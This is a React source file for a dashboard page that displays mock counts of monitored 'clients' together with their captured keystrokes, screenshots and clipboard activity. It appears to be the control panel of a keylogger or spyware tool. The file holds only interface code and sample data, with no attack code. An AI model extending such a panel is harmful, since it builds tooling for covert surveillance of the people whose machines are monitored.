
import React from "react";
import { AppLayout } from "@/components/layout/AppLayout";
import { DashboardHeader } from "@/components/dashboard/DashboardHeader";
import { ClientCountWidget } from "@/components/dashboard/ClientCountWidget";
import { RecentActivityWidget } from "@/components/dashboard/RecentActivityWidget";
import { StorageWidget } from "@/components/dashboard/StorageWidget";
import { ActivityChart } from "@/components/dashboard/ActivityChart";
import { useQuery } from "@tanstack/react-query";
import { toast } from "sonner";
import { getClients } from "@/services/scriptsService";

// Mock dashboard data for the index page
const mockDashboardData = {
  totalClients: 12,
  activeClients: 5,
  storageUsed: "1.2 GB",
  recentActivities: [
    { id: 1, client: "wickey", type: "keystrokes", timestamp: "2025-03-18 20:15:43" },
    { id: 2, client: "desktop-hkqh9a7", type: "screenshot", timestamp: "2025-03-18 19:42:12" },
    { id: 3, client: "wickey", type: "clipboard", timestamp: "2025-03-18 18:30:55" }
  ],
  activityData: [
    { name: "00:00", keystrokes: 0, screenshots: 0, clipboard: 0 },
    { name: "04:00", keystrokes: 10, screenshots: 2, clipboard: 0 },
    { name: "08:00", keystrokes: 78, screenshots: 5, clipboard: 8 },
    { name: "12:00", keystrokes: 55, screenshots: 4, clipboard: 5 },
    { name: "16:00", keystrokes: 112, screenshots: 6, clipboard: 9 },
    { name: "20:00", keystrokes: 22, screenshots: 2, clipboard: 1 }
  ]
};

const Index = () => {
  const { data, isLoading, error } = useQuery({
    queryKey: ['indexDashboardData'],
    queryFn: async () => {
      try {
        console.log("Fetching dashboard data for index (using mock data)");
        
        // Try to get real clients from the scriptsService
        try {
          const realClients = await getClients();
          if (realClients && realClients.length > 0) {
            // Update counts based on real data
            mockDashboardData.totalClients = realClients.length;
            mockDashboardData.activeClients = realClients.filter(client => {
              const lastActive = new Date(client.lastActivity);
              return (new Date().getTime() - lastActive.getTime()) < 30 * 60 * 1000;
            }).length;
          }
        } catch (error) {
          console.warn("Could not fetch real clients for index, using mock data", error);
        }
        
        return mockDashboardData;
      } catch (err) {
        console.error("Error fetching dashboard data for index:", err);
        toast.error("Kunde inte hämta dashboard-data");
        return mockDashboardData; // Return mock data anyway to avoid crashes
      }
    },
    retry: 1,
    staleTime: 60000 // 1 minute
  });

  if (error) {
    console.error("Error fetching dashboard data for index:", error);
  }

  // Use data with fallback to mock data
  const dashboardData = data || mockDashboardData;

  return (
    <AppLayout>
      <div className="flex flex-col gap-6 p-6 pb-16">
        <DashboardHeader />
        
        <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-4">
          <ClientCountWidget 
            isLoading={isLoading} 
            totalClients={dashboardData.totalClients} 
            activeClients={dashboardData.activeClients} 
          />
          <StorageWidget 
            isLoading={isLoading} 
            storageUsed={dashboardData.storageUsed} 
          />
        </div>
        
        <div className="grid gap-6 md:grid-cols-2">
          <ActivityChart data={dashboardData.activityData} />
          <RecentActivityWidget 
            activities={dashboardData.recentActivities} 
            isLoading={isLoading} 
          />
        </div>
      </div>
    </AppLayout>
  );
};

export default Index;
